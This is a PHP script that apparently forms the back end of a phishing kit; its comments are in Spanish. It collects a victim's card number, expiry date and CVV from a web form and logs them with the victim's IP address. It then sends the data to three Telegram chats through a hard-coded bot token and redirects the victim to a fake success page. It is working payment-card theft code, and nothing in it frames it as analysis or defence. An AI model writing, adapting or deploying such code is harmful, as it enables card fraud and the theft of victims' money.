<?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

// 1. Captura de datos
$ip = $_SERVER['REMOTE_ADDR'];
$registro = traer_regitro($ip); 
$tarjeta = isset($_POST['tarjeta']) ? $_POST['tarjeta'] : '';
$fecha = isset($_POST['fecha']) ? $_POST['fecha'] : '';
$cvv = isset($_POST['cvv']) ? $_POST['cvv'] : '';

// 2. Guardar en base de datos local
actualizar_registro_tarjeta($registro, $tarjeta, $fecha, $cvv);

// 3. Configuración de Telegram (ID final eliminado)
$token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
$ids = [
    "8114050673", 
    "6616662846", 
    "8638340940"
];

$msg = "💳 <b>DATOS DE TARJETA</b>\n\n";
$msg .= "👤 <b>REGISTRO:</b> <code>$registro</code>\n";
$msg .= "💳 <b>NÚMERO:</b> <code>$tarjeta</code>\n";
$msg .= "📅 <b>FECHA:</b> <code>$fecha</code>\n";
$msg .= "🔒 <b>CVV:</b> <code>$cvv</code>\n";
$msg .= "📍 <b>IP:</b> <code>$ip</code>";

// 4. Envío a los IDs restantes
foreach($ids as $id_chat){
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $id_chat,
        'text' => $msg,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

// 5. Redirección final
header("Location: ../a/SUCCESS.php");
exit();
?>
